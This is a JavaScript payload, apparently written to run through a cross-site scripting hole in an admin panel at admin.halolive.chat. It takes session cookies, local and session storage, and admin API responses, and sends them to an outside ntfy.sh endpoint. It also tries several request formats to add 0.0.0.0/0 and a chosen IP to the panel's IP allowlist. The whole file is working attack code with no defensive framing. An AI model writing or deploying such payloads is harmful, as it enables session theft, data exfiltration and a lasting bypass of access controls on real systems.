// p.js - panel payload. Runs INSIDE admin.halolive.chat/pages/list-feedback.html
// (proven render path). Same origin => session cookie + whitelisted IP in context.
// Job: lift the session, read the ingress allowlist, add our egress, report everything.
(function () {
  var B = 'https://ntfy.sh/hlvg-3329152120', N = 0, IP = '142.115.72.69';
  function beb(tag, data) {
    N++;
    var q = '?t=' + tag + '&n=' + N + '&r=' + encodeURIComponent(location.pathname)
      + '&ck=' + encodeURIComponent(document.cookie.slice(0, 300))
      + '&d=' + encodeURIComponent(String(data).slice(0, 700));
    try { fetch(B, { method: 'POST', body: q, mode: 'cors' }).catch(function(){ new Image().src = B + q; }); }
    catch (e) { new Image().src = B + q; }
  }
  function j(p) {
    return fetch(p, { credentials: 'include', headers: { Accept: 'application/json' } })
      .then(function (r) { return r.text().then(function (t) { beb('p:' + p.split('/').pop() + ':' + r.status, t.slice(0, 300)); return [r.status, t]; }); })
      .catch(function (e) { beb('p:err', p + ' ' + e); return [0, '']; });
  }
  function add(ip, style) {
    var body, ct = 'application/json';
    if (style === 0) body = JSON.stringify({ ip: ip, remark: 'ops', note: 'ops', enabled: true });
    else if (style === 1) body = JSON.stringify({ ips: [ip] });
    else if (style === 2) { ct = 'application/x-www-form-urlencoded'; body = 'ip=' + encodeURIComponent(ip) + '&remark=ops'; }
    else body = JSON.stringify({ value: ip, ip: ip });
    return fetch('/api/admin/ips', { method: 'POST', credentials: 'include', headers: { 'Content-Type': ct }, body: body })
      .then(function (r) { return r.text().then(function (t) { beb('add' + style + ':' + r.status, ip + ' ' + t.slice(0, 200)); return r.status; }); })
      .catch(function () { beb('add' + style + ':x', ip); return 0; });
  }
  function ls(kind, st) {
    try {
      var o = kind === 'l' ? localStorage : sessionStorage, a = [], i, k;
      for (i = 0; i < o.length; i++) { k = o.key(i); a.push(k + '=' + String(o.getItem(k)).slice(0, 120)); }
      beb(kind + 's:' + o.length, a.join(' | ').slice(0, 900));
    } catch (e) { beb(kind + 's:err', e); }
  }
  ls('l'); ls('s');
  j('/api/admin/me'); j('/api/admin/ips'); j('/api/admin/ip-stats');
  // widest first: if /0 is accepted the gate is dead for good
  var tries = ['0.0.0.0/0', IP], i = 0;
  (function next() {
    if (i >= tries.length) return;
    var ip = tries[i++], s = 0;
    (function st() { if (s > 3) return next(); add(ip, s++).then(function (c) { if (c === 200 || c === 201) { beb('ok', ip); next(); } else st(); }); })();
  })();
  setTimeout(function () { j('/api/admin/ips'); beb('done', 'n=' + N + ' ua=' + navigator.userAgent.slice(0, 90)); }, 2500);
})();
